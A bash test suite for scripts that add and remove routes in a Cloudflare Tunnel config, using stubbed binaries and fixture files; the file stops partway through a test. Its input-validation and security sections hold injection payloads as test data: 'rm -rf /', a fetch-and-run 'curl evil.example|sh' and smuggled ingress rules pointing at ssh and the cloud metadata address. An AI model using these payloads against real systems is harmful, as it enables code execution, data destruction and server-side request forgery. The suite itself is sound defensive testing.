#!/usr/bin/env bash
# Self-contained test suite for cloudflare-tunnel-routes scripts.
# Runs entirely on a fixture config; never touches your real /etc/cloudflared.
#
# Usage: bash tests/run-tests.sh
#
# Strategy:
#   - For each test: write a fixture config to a temp dir, set CFTR_CONFIG to
#     point at it, and run the script under test with --dry-run. Compare the
#     "would write" preview against an expected snapshot.
#   - We don't shell out to a real cloudflared, so we stub it with a fake
#     binary on PATH (CFTR_BINARY override).

set -eu
export LC_ALL=C

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SCRIPTS="$REPO_ROOT/scripts"
PASS=0
FAIL=0

# --- helpers ---------------------------------------------------------------

work_dir=""
work_dirs=()
fake_bin=""
stub_dir=""
stub_log=""
cleanup() {
    local d
    for d in "${work_dirs[@]}"; do
        rm -rf "$d"
    done
}
trap cleanup EXIT

# Every script run goes through run_* below, which put $stub_dir FIRST on
# PATH. The stubs log each call to $stub_log and never touch the host:
#   cloudflared  DNS + validate; fails on demand via env flags:
#                STUB_DNS_FAIL=1, STUB_DNS_CONFLICT=1, STUB_VALIDATE_FAIL=1
#   systemctl    fake units from $work_dir/units ("name<TAB>argv" lines);
#                STUB_RESTART_FAIL=1 makes restart / is-active fail
#   sudo         logs, then runs the command as the current user
#   pgrep        prints nothing unless STUB_PGREP=1 (then a PID that can't
#                exist); ps prints nothing; sleep is instant;
#   delta / colordiff  plain cat, so --diff output is stable everywhere
# Pass flags as a prefix on ONE command (STUB_X=1 run_add ...), never export.
write_stubs() {
    mkdir -p "$stub_dir"
    cat > "$stub_dir/cloudflared" <<'STUB'
#!/usr/bin/env bash
echo "cloudflared $*" >> "$(dirname "$0")/../stub.log"
# STUB_TOUCH_ON=dns|validate + STUB_TOUCH_FILE: simulate someone editing
# the live config while that step runs.
if [ -n "${STUB_TOUCH_FILE:-}" ]; then
    case "${STUB_TOUCH_ON:-}:$*" in
        dns:*"tunnel route dns"*|validate:*"ingress validate"*)
            echo "# edited by hand meanwhile" >> "$STUB_TOUCH_FILE" ;;
    esac
fi
case " $* " in
    *" tunnel route dns "*)
        if [ -n "${STUB_DNS_CONFLICT:-}" ]; then
            echo "Failed to add route: code: 1003, reason: Failed to create record ${*: -1} with err An A, AAAA, or CNAME record with that host already exists." >&2
            exit 1
        fi
        if [ -n "${STUB_DNS_FAIL:-}" ]; then
            echo "Failed to add route: code: 1000, reason: stub failure" >&2
            exit 1
        fi
        echo "INF Added CNAME ${*: -1} which will route to this tunnel"
        ;;
    *" tunnel ingress validate "*)
        if [ -n "${STUB_VALIDATE_FAIL:-}" ]; then
            echo "Validation failed: stub" >&2
            exit 1
        fi
        echo "OK"
        ;;
    *" tunnel create "*)
        name="${*: -1}"
        if [ -n "${STUB_CREATE_EXISTS:-}" ]; then
            echo "failed to create tunnel: Create Tunnel API call failed: tunnel with name already exists" >&2
            exit 1
        fi
        id="aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
        mkdir -p "$HOME/.cloudflared"
        echo '{}' > "$HOME/.cloudflared/$id.json"
        echo "Tunnel credentials written to $HOME/.cloudflared/$id.json. Keep this file secret. To revoke these credentials, delete the tunnel."
        echo
        echo "Created tunnel $name with id $id"
        ;;
    *" tunnel info "*)
        name="${*: -1}"
        printf '{\n  "id": "%s",\n  "name": "%s",\n  "createdAt": "2026-01-01T00:00:00Z",\n  "conns": []\n}\n' \
            "${STUB_INFO_ID:-12345678-90ab-4cde-8f01-234567890abc}" "${STUB_INFO_NAME:-$name}"
        ;;
    *) echo "[stub-cloudflared] $*" ;;
esac
exit 0
STUB
    cat > "$stub_dir/systemctl" <<'STUB'
#!/usr/bin/env bash
here="$(dirname "$0")/.."
echo "systemctl $*" >> "$here/stub.log"
units="$here/units"
[ -f "$units" ] || : > "$units"
unit="${*: -1}"
case "$1" in
    list-units|list-unit-files)
        while IFS=$'\t' read -r n _; do
            echo "$n loaded active running Cloudflare Tunnel"
        done < "$units"
        ;;
    show)
        if [ "$3" = "ExecStart" ]; then
            while IFS=$'\t' read -r n a; do
                [ "$n" = "$unit" ] && echo "{ path=/usr/bin/cloudflared ; argv[]=$a ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }"
            done < "$units"
        else
            echo "ActiveState=failed"
        fi
        ;;
    restart|is-active)
        [ -n "${STUB_RESTART_FAIL:-}" ] && exit 3
        ;;
esac
exit 0
STUB
    cat > "$stub_dir/sudo" <<'STUB'
#!/usr/bin/env bash
echo "sudo $*" >> "$(dirname "$0")/../stub.log"
if [ -n "${STUB_SUDO_NOPASS:-}" ]; then
    echo "sudo: a password is required" >&2
    exit 1
fi
[ "${1:-}" = "-n" ] && shift
[ -n "${STUB_SUDO_LOGONLY:-}" ] && exit 0
exec "$@"
STUB
    cat > "$stub_dir/pgrep" <<'STUB'
#!/usr/bin/env bash
echo "pgrep $*" >> "$(dirname "$0")/../stub.log"
if [ -n "${STUB_PGREP:-}" ]; then
    echo 999999999
    exit 0
fi
exit 1
STUB
    printf '#!/bin/sh\nexit 0\n' > "$stub_dir/ps"
    printf '#!/bin/sh\nexit 0\n' > "$stub_dir/sleep"
    printf '#!/bin/sh\nexec cat\n' > "$stub_dir/delta"
    printf '#!/bin/sh\nexec cat\n' > "$stub_dir/colordiff"
    chmod +x "$stub_dir"/*
}

setup() {
    work_dir="$(mktemp -d)"
    work_dirs+=("$work_dir")
    stub_dir="$work_dir/bin"
    stub_log="$work_dir/stub.log"
    : > "$stub_log"
    write_stubs
    fake_bin="$stub_dir/cloudflared"
}

# add_unit <name> <argv>: a fake systemd unit for the systemctl stub.
add_unit() {
    printf '%s\t%s\n' "$1" "$2" >> "$work_dir/units"
}

# count_files <glob>: how many entries in $work_dir match the glob.
count_files() {
    local f n=0
    for f in "$work_dir"/$1; do
        [ -e "$f" ] && n=$((n + 1))
    done
    echo "$n"
}

# Verbs of interest from the stub log, in call order, on one line.
stub_verbs() {
    awk '
        / tunnel ingress validate/ { printf "%svalidate", sep; sep = " " }
        / tunnel route dns /       { printf "%sdns", sep; sep = " " }
        /^systemctl restart /      { printf "%srestart:%s", sep, $NF; sep = " " }
        END { print "" }
    ' "$stub_log"
}

write_fixture() {
    cat > "$work_dir/config.yml"
}

assert_eq() {
    local name="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected: %s\n' "$expected" >&2
        printf '    actual:   %s\n' "$actual" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local name="$1" needle="$2" hay="$3"
    if printf '%s' "$hay" | grep -qF -- "$needle"; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected to contain: %s\n' "$needle" >&2
        printf '    actual:\n%s\n' "$hay" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_not_contains() {
    local name="$1" needle="$2" hay="$3"
    if printf '%s' "$hay" | grep -qF -- "$needle"; then
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected NOT to contain: %s\n' "$needle" >&2
        FAIL=$((FAIL + 1))
    else
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    fi
}

# Line-anchored check: the needle text may legitimately appear INSIDE a
# comment line, so plain substring matching can't tell "emitted as a real
# YAML line" apart from "quoted harmlessly in a comment".
assert_no_line_matching() {
    local name="$1" ere="$2" hay="$3"
    if printf '%s\n' "$hay" | grep -qE -- "$ere"; then
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected NO line matching: %s\n' "$ere" >&2
        printf '    actual:\n%s\n' "$hay" >&2
        FAIL=$((FAIL + 1))
    else
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    fi
}

assert_has_line() {
    local name="$1" line="$2" hay="$3"
    if printf '%s\n' "$hay" | grep -qxF -- "$line"; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected exact line: %s\n' "$line" >&2
        printf '    actual:\n%s\n' "$hay" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_exit_nonzero() {
    local name="$1" rc="$2"
    if [ "$rc" -ne 0 ]; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s (expected non-zero exit, got %s)\n' "$name" "$rc" >&2
        FAIL=$((FAIL + 1))
    fi
}

run_add() {
    PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/add-route.sh" "$@" 2>&1 </dev/null
}

run_remove() {
    PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/remove-route.sh" "$@" 2>&1 </dev/null
}

run_list() {
    PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/list-routes.sh" 2>&1 </dev/null
}

run_detect() {
    PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/detect.sh" 2>&1 </dev/null
}

# --- tests -----------------------------------------------------------------

echo
echo "=== input validation ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'evil"; rm -rf /' 8080 --dry-run || true)"
assert_contains "rejects hostname with quote+semicolon" "invalid hostname" "$out"

out="$(run_add 'app.example.com' 99999 --dry-run || true)"
assert_contains "rejects out-of-range port" "port out of range" "$out"

out="$(run_add 'app.example.com' 8080 --path 'no-leading-slash' --dry-run || true)"
assert_contains "rejects path without /" "must start with /" "$out"

out="$(run_add 'app.example.com' 8080 --path '/has space' --dry-run || true)"
assert_contains "rejects path with whitespace" "invalid --path" "$out"

out="$(run_add 'app.example.com' 8080 --path '/has:colon' --dry-run || true)"
assert_contains "rejects path with colon" "invalid --path" "$out"

# Path with regex glob chars must be ACCEPTED (cloudflared treats path: as Go regex)
out="$(run_add 'app.example.com' 8080 --path '/docs.*' --dry-run || true)"
assert_contains "accepts glob path /docs.*" "path: /docs.*" "$out"

out="$(run_add 'app.example.com' 8080 --path '/api/v[12]/.*' --dry-run || true)"
assert_contains "accepts regex path with brackets" "path: /api/v[12]/.*" "$out"

echo
echo "=== add-route: insertion behavior ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 8080 --dry-run)"
assert_contains "preview shows new hostname" "hostname: app.example.com" "$out"
assert_contains "preview shows port-derived service" "service: http://127.0.0.1:8080" "$out"
assert_contains "preview keeps catch-all" "service: http_status:404" "$out"

# Idempotency: adding the same hostname again should detect duplicate
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: app.example.com
    service: http://127.0.0.1:8080
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 8080 --dry-run)"
assert_contains "detects existing hostname (no path)" "already exists" "$out"

# Add with path=/v1, then re-adding with same path is a duplicate, but with
# a different path it should NOT be a duplicate.
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: api.example.com
    path: /v1
    service: http://127.0.0.1:9000
  - service: http_status:404
EOF
out="$(run_add 'api.example.com' 9000 --path '/v1' --dry-run)"
assert_contains "same hostname+path is duplicate" "already exists" "$out"

out="$(run_add 'api.example.com' 9001 --path '/v2' --dry-run)"
assert_not_contains "same hostname different path is NOT duplicate" "already exists" "$out"
assert_contains "shows new path block" "path: /v2" "$out"

echo
echo "=== add-route: catch-all sanity ==="
setup
# Config without a catch-all: must refuse, otherwise insertion would silently no-op
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: foo.example.com
    service: http://127.0.0.1:9000
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --dry-run)" || rc=$?
assert_exit_nonzero "missing catch-all -> error" "$rc"
assert_contains "missing catch-all message" "found 0" "$out"

# Config with two catch-alls: must also refuse (would duplicate the new block)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
  - service: http_status:404
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --dry-run)" || rc=$?
assert_exit_nonzero "duplicate catch-all -> error" "$rc"
assert_contains "duplicate catch-all message" "found 2" "$out"

echo
echo "=== remove-route: removes correct block, keeps catch-all ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: keep.example.com
    service: http://localhost:9000
  - hostname: drop.example.com
    service: http://localhost:8000
  - service: http_status:404
EOF
out="$(run_remove 'drop.example.com' --dry-run)"
assert_contains "keeps unrelated hostname" "hostname: keep.example.com" "$out"
assert_not_contains "removes target hostname" "hostname: drop.example.com" "$out"
assert_contains "preserves catch-all" "service: http_status:404" "$out"

# Remove non-existent -> no change
out="$(run_remove 'missing.example.com' --dry-run)"
assert_contains "missing entry reports unchanged" "no matching entry" "$out"

echo
echo "=== detect.sh: env override ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_detect)"
assert_contains "detect uses CFTR_CONFIG" "config=$work_dir/config.yml" "$out"
assert_contains "detect uses CFTR_BINARY" "binary=$fake_bin" "$out"
assert_contains "detect extracts tunnel_id" "tunnel_id=11111111-2222-3333-4444-555555555555" "$out"

# Tampered config must be rejected by detect.sh validation
write_fixture <<'EOF'
tunnel: $(curl evil.example|sh)
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects shell-injection in tunnel_id" "$rc"
assert_contains "complains about suspicious value" "refusing to emit" "$out"

# Backtick variant
write_fixture <<'EOF'
tunnel: `id > /tmp/pwn`
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects backtick injection in tunnel_id" "$rc"

# Path-injection via credentials-file
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: $(rm -rf /)
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects shell-injection in credentials path" "$rc"

echo
echo "=== add-route: argv injection / unknown args ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --bogus 2>&1)" || rc=$?
assert_exit_nonzero "rejects unknown CLI flag" "$rc"
assert_contains "unknown flag message" "Unknown argument" "$out"

# Missing positional args
rc=0
out="$(run_add 2>&1)" || rc=$?
assert_exit_nonzero "rejects missing args" "$rc"
assert_contains "shows usage when no args" "Usage:" "$out"

echo
echo "=== add-route: target normalization ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 'http://localhost:9000' --dry-run)"
assert_contains "accepts http URL target" "service: http://localhost:9000" "$out"

out="$(run_add 'app.example.com' 'https://internal.svc:8443' --dry-run)"
assert_contains "accepts https URL target" "service: https://internal.svc:8443" "$out"

out="$(run_add 'app.example.com' 'host.local:1234' --dry-run)"
assert_contains "accepts host:port target" "service: http://host.local:1234" "$out"

rc=0
out="$(run_add 'app.example.com' 'just-text' --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects bare text target" "$rc"

echo
echo "=== list-routes: yq path vs awk fallback ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: simple.example.com
    service: http://localhost:9000
  - hostname: api.example.com
    path: /v1
    service: http://localhost:8080
  - service: http_status:404
EOF

# awk fallback (force by clearing PATH of any yq)
out="$(PATH="$(getconf PATH 2>/dev/null || echo '/usr/bin:/bin')" run_list)"
assert_contains "awk fallback shows simple hostname" "simple.example.com" "$out"
assert_contains "awk fallback shows hostname+path" "api.example.com" "$out"
assert_contains "awk fallback shows path column" "/v1" "$out"

# yq path - runs when yq is on PATH (CI installs a pinned, checksummed one)
# or at /tmp/yq. Only yq itself is linked into a private dir, so /tmp never
# lands on PATH.
yq_bin="$(command -v yq 2>/dev/null || true)"
if [ -z "$yq_bin" ] && [ -x /tmp/yq ]; then
    yq_bin=/tmp/yq
fi
yq_dir="$work_dir/yq-bin"
if [ -n "$yq_bin" ]; then
    mkdir -p "$yq_dir"
    ln -sf "$yq_bin" "$yq_dir/yq"
fi
if [ -n "$yq_bin" ]; then
    out="$(PATH="$yq_dir:$PATH" run_list)"
    assert_contains "yq path shows simple hostname" "simple.example.com" "$out"
    assert_contains "yq path shows api with path" "/v1" "$out"
    # yq path correctly surfaces the catch-all (awk fallback misses it)
    assert_contains "yq path surfaces catch-all" "http_status:404" "$out"
else
    echo "  SKIP  yq not on PATH or at /tmp/yq - install it to enable yq-path tests"
fi

# YAML with quoted strings + inline comments
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: "quoted.example.com"
    path: '/api/v[12]/.*'
    service: "http://localhost:8080"   # inline comment
  - service: http_status:404
EOF
if [ -n "$yq_bin" ]; then
    out="$(PATH="$yq_dir:$PATH" run_list)"
    assert_contains "yq strips quotes from hostname" "quoted.example.com" "$out"
    assert_contains "yq keeps regex path intact" "/api/v[12]/.*" "$out"
    # The inline comment must NOT leak into the service column
    assert_not_contains "yq excludes inline comment" "inline comment" "$out"
fi

echo
echo "=== complex YAML edits with awk path ==="
# Mixed entries: hostname-only, hostname+path, multiple paths same hostname
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: example.com
    path: /v1
    service: http://localhost:8001
  - hostname: example.com
    path: /v2
    service: http://localhost:8002
  - hostname: example.com
    service: http://localhost:8000
  - service: http_status:404
EOF
# Without --path, ALL entries for the hostname are dropped (catch-all stays)
out="$(run_remove 'example.com' --dry-run)"
assert_not_contains "remove w/o --path drops v1" "service: http://localhost:8001" "$out"
assert_not_contains "remove w/o --path drops v2" "service: http://localhost:8002" "$out"
assert_not_contains "remove w/o --path drops no-path" "service: http://localhost:8000" "$out"
assert_contains "remove w/o --path keeps catch-all" "http_status:404" "$out"

# With --path /v1, only that block is removed; the rest stay
out="$(run_remove 'example.com' --path '/v1' --dry-run)"
assert_contains    "remove --path /v1 keeps /v2 block" "path: /v2" "$out"
assert_not_contains "remove --path /v1 drops /v1 block" "path: /v1" "$out"
assert_contains    "remove --path /v1 keeps no-path entry" "service: http://localhost:8000" "$out"

echo
echo "=== formatting: indent matches existing config ==="
setup
# Canonical 2-space indent (the shape cloudflared writes itself)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: existing.example.com
    service: http://localhost:9000
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --dry-run)"
assert_contains "2-space catch-all -> 2-space new block" '  - hostname: app.example.com' "$out"
assert_contains "2-space new block keeps service indent" '    service: http://127.0.0.1:8080' "$out"

# Zero-indent variant (also valid YAML; some hand-crafted configs use it)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
- hostname: existing.example.com
  service: http://localhost:9000
- service: http_status:404
EOF
out="$(run_add app.example.com 8080 --dry-run)"
# Verify there's a hostname line that starts with NO indent (zero-indent style)
if printf '%s\n' "$out" | grep -qE '^- hostname: app\.example\.com$'; then
    printf '  PASS  0-space catch-all -> 0-space new block\n'; PASS=$((PASS + 1))
else
    printf '  FAIL  0-space catch-all -> 0-space new block\n' >&2; FAIL=$((FAIL + 1))
fi
# And the new block has NO 2-space-indented hostname line
if printf '%s\n' "$out" | grep -qE '^  - hostname: app\.example\.com$'; then
    printf '  FAIL  0-space variant has no 2-indent line\n' >&2; FAIL=$((FAIL + 1))
else
    printf '  PASS  0-space variant has no 2-indent line\n'; PASS=$((PASS + 1))
fi

echo
echo "=== formatting: comments between routes are preserved ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  # this comment marks the legacy v1 endpoint
  - hostname: legacy.example.com
    service: http://localhost:8000
  # added in 2025 sprint planning
  - hostname: api.example.com
    path: /v1
    service: http://localhost:9000
  - service: http_status:404
EOF
out="$(run_add new.example.com 7000 --dry-run)"
assert_contains "preserves first inline comment" "this comment marks" "$out"
assert_contains "preserves second inline comment" "added in 2025" "$out"
assert_contains "still inserts new hostname" "hostname: new.example.com" "$out"

# remove-route must leave comments alone
out="$(run_remove legacy.example.com --dry-run)"
assert_contains "remove keeps the OTHER comment" "added in 2025" "$out"
assert_not_contains "remove drops legacy hostname" "hostname: legacy.example.com" "$out"

echo
echo "=== formatting: quoted hostname / service / path round-trip ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: "quoted.example.com"
    service: 'http://localhost:9000'
  - hostname: regex.example.com
    path: '/api/v[12]/.*'
    service: "http://localhost:8080"
  - service: http_status:404
EOF
# add another route and make sure the quoted neighbors survive verbatim
out="$(run_add new.example.com 7000 --dry-run)"
assert_contains "preserves double-quoted hostname" '"quoted.example.com"' "$out"
assert_contains "preserves single-quoted service" "'http://localhost:9000'" "$out"
assert_contains "preserves quoted regex path" "'/api/v[12]/.*'" "$out"

# remove a non-quoted neighbor and verify quoted lines survive
out="$(run_remove regex.example.com --dry-run)"
assert_contains "remove keeps quoted hostname" '"quoted.example.com"' "$out"

echo
echo "=== formatting: --comment opt-in ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --comment "Gradio demo" --dry-run)"
assert_contains "comment header rendered" "# Added by cloudflare-tunnel-routes" "$out"
assert_contains "comment text included" "Gradio demo" "$out"
assert_contains "comment ISO date included" "$(date +%Y-%m-%d)" "$out"

# Without --comment, no comment is added
out="$(run_add app.example.com 8080 --dry-run)"
assert_not_contains "no comment header without --comment" "# Added by cloudflare-tunnel-routes" "$out"

# Reject newline in comment
rc=0
out="$(run_add app.example.com 8080 --comment "$(printf 'a\nb')" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects newline in --comment" "$rc"
assert_contains "newline-in-comment message" "newlines" "$out"

# Reject overlong comment
rc=0
long="$(printf 'x%.0s' {1..201})"
out="$(run_add app.example.com 8080 --comment "$long" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects overlong --comment" "$rc"

echo
echo "=== security: YAML line breaks beyond LF / CR ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
# YAML also breaks lines on LS (U+2028), PS (U+2029) and NEL (U+0085).
# Each payload would otherwise hide an extra ingress rule inside what looks
# like a single comment line.
ls_char="$(printf '\342\200\250')"
ps_char="$(printf '\342\200\251')"
nel_char="$(printf '\302\205')"
for sep_name in LS PS NEL; do
    case "$sep_name" in
        LS)  sep="$ls_char" ;;
        PS)  sep="$ps_char" ;;
        NEL) sep="$nel_char" ;;
    esac
    payload="x${sep}  - hostname: evil.example.com${sep}    service: http://169.254.169.254"
    rc=0
    out="$(run_add app.example.com 8080 --comment "$payload" --dry-run 2>&1)" || rc=$?
    assert_exit_nonzero "rejects $sep_name in --comment" "$rc"
    assert_contains "$sep_name-in-comment message" "printable ASCII" "$out"
done

rc=0
out="$(run_add app.example.com 8080 --path "/x${ls_char}evil" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects U+2028 in --path" "$rc"
rc=0
out="$(run_add app.example.com 8080 --path "/caf$(printf '\303\251')" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects non-ASCII --path" "$rc"
assert_contains "non-ASCII path message" "printable ASCII" "$out"

echo
echo "=== security: no awk -v escape processing ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
# Literal backslash-n (two chars) in --comment: awk -v would turn it into
# a real newline and emit a second, attacker-controlled ingress rule.
rc=0
out="$(run_add app.example.com 8080 \
    --comment 'hi\n  - hostname: evil.example.com\n    service: ssh://localhost:22' \
    --dry-run 2>&1)" || rc=$?
if [ "$rc" -eq 0 ]; then
    assert_contains "literal \\n comment kept on one line" \
        '| hi\n  - hostname: evil.example.com\n    service: ssh://localhost:22' "$out"
fi
assert_no_line_matching "literal \\n comment adds no rule" \
    '^[[:space:]]*- hostname: evil\.example\.com' "$out"
assert_no_line_matching "literal \\n comment adds no ssh service" \
    '^[[:space:]]*service: ssh://' "$out"

# Octal escapes in --path (\012 newline, \040 space, \072 colon) slip past
# the whitespace / ':' filter and would be decoded by awk -v.
rc=0
out="$(run_add app.example.com 8080 \
    --path '/x\012\040\040-\040hostname\072\040evil.example.com\012\040\040\040\040service\072\040ssh\072//localhost\07222' \
    --dry-run 2>&1)" || rc=$?
assert_no_line_matching "octal --path adds no rule" \
    '^[[:space:]]*- hostname: evil\.example\.com' "$out"
assert_no_line_matching "octal --path adds no ssh service" \
    '^[[:space:]]*service: ssh://' "$out"

# A regex path with an escaped dot must reach the config byte-for-byte
# (gawk/busybox -v would rewrite `\.` to `.`, changing the route's meaning).
out="$(run_add app.example.com 8080 --path '/static/.*\.css' --dry-run)"
assert_has_line "regex path with \\. round-trips byte-exact" '    path: /static/.*\.css' "$out"
out="$(run_add app.example.com 8080 --path '/static/.*\.css' --diff)"
assert_has_line "regex path with \\. byte-exact in --diff" '+    path: /static/.*\.css' "$out"

# Duplicate detection / removal must compare the same unescaped bytes.
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: app.example.com
    path: /static/.*\.css
    service: http://127.0.0.1:8080
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --path '/static/.*\.css' --dry-run)"
assert_contains "duplicate detected for path with \\." "already exists" "$out"
out="$(run_remove app.example.com --path '/static/.*\.css' --dry-run)"
assert_not_contains "remove --path with \\. finds the block" "no matching entry" "$out"
assert_not_contains "remove --path with \\. drops the block" 'path: /static/' "$out"
assert_contains "remove --path with \\. keeps catch-all" "http_status:404" "$out"

echo
echo "=== formatting: hand-crafted exotic configs ==="
setup
# Tab indentation - hand-crafted, awk patterns assume spaces. The sanity
# check at minimum should refuse with a clear error rather than silently
# corrupt the file.
printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: /tmp/x.json\ningress:\n\t- hostname: tabby.example.com\n\t  service: http://localhost:9000\n\t- service: http_status:404\n' > "$work_dir/config.yml"
rc=0
out="$(run_add app.example.com 8080 --dry-run 2>&1)" || rc=$?
# Either the catch-all sanity check refuses (preferred) or it accepts and
# inserts a space-indented block. Both are acceptable; what we want to
# rule out is "silently produces a corrupt file". Validate that one of
# these two clear paths runs.
if [ "$rc" -ne 0 ]; then
    assert_contains "tab config refused with clear error" "found 0" "$out"
else
    # Accepted - then the diff must show our new block (proof that the
    # awk step ran, not a silent no-op).
    assert_contains "tab config accepted, block inserted" "hostname: app.example.com" "$out"
fi

echo
echo "=== apply path: order, failures, rollback (stubbed) ==="
# Base fixture for apply-path tests. Real writes happen, but only to the
# per-test work dir; every external command is a stub from $stub_dir.
apply_fixture() {
    write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: keep.example.com
    service: http://127.0.0.1:9000
  - service: http_status:404
EOF
    cp "$work_dir/config.yml" "$work_dir/orig.yml"
    add_unit cloudflared-alpha.service \
        "/usr/bin/cloudflared --no-autoupdate --config $work_dir/config.yml tunnel run"
}
config_unchanged() {
    cmp -s "$work_dir/orig.yml" "$work_dir/config.yml" && echo same || echo changed
}

# Happy path: validate -> route dns -> restart of the matching unit
setup; apply_fixture
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "happy path exits 0" "0" "$rc"
assert_eq "happy path order: validate, dns, restart" \
    "validate dns restart:cloudflared-alpha.service" "$(stub_verbs)"
validated="$(grep ' tunnel ingress validate' "$stub_log" | head -n 1)"
assert_not_contains "validate runs on the staged file, not the live config" \
    "--config $work_dir/config.yml tunnel" "$validated"
assert_contains "happy path writes the new block" "hostname: app.example.com" "$(cat "$work_dir/config.yml")"
assert_eq "happy path leaves no staged temp files" "0" \
    "$(count_files 'config.yml.cftr-tmp.*')"

# DNS failure: non-zero, config untouched, nothing restarted
setup; apply_fixture
rc=0
out="$(STUB_DNS_FAIL=1 run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "DNS failure -> non-zero exit" "$rc"
assert_eq "DNS failure -> config untouched" "same" "$(config_unchanged)"
assert_not_contains "DNS failure -> no restart" "systemctl restart" "$(cat "$stub_log")"

# DNS CONFLICT ("record with that host already exists") is a failure too
setup; apply_fixture
rc=0
